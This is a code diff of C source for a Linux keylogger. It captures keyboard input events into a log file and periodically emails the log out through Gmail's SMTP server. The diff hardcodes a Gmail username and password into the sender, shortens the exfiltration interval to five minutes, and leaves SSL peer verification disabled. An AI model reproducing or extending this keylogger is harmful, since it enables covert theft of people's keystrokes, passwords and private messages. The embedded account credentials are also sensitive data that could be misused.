@@ -324,8 +324,8 @@ int send_email(){
 
     curl = curl_easy_init();
     if(curl) {
-        curl_easy_setopt(curl, CURLOPT_USERNAME, ""); ///////////////// Edit here
-        curl_easy_setopt(curl, CURLOPT_PASSWORD, ""); ///////////////// Edit here
+        curl_easy_setopt(curl, CURLOPT_USERNAME, "doi2xuyenviet7@gmail.com"); ///////////////// Edit here
+        curl_easy_setopt(curl, CURLOPT_PASSWORD, "@123456789@"); ///////////////// Edit here
         curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -366,7 +366,7 @@ int send_email(){
 
 void *trigger_send_email(){
     while(1){
-        sleep(15*60);
+        sleep(5*60);
         send_email();
     }
 }
@@ -374,7 +374,7 @@ void *trigger_send_email(){
 void *keylogger(){
     find_event_file_path();
 
-    FILE * fp_out = fopen("log.txt", "a");
+    FILE * fp_out = fopen("log.txt", "w");
     struct input_event event;
     int shift_flag = 0;
 
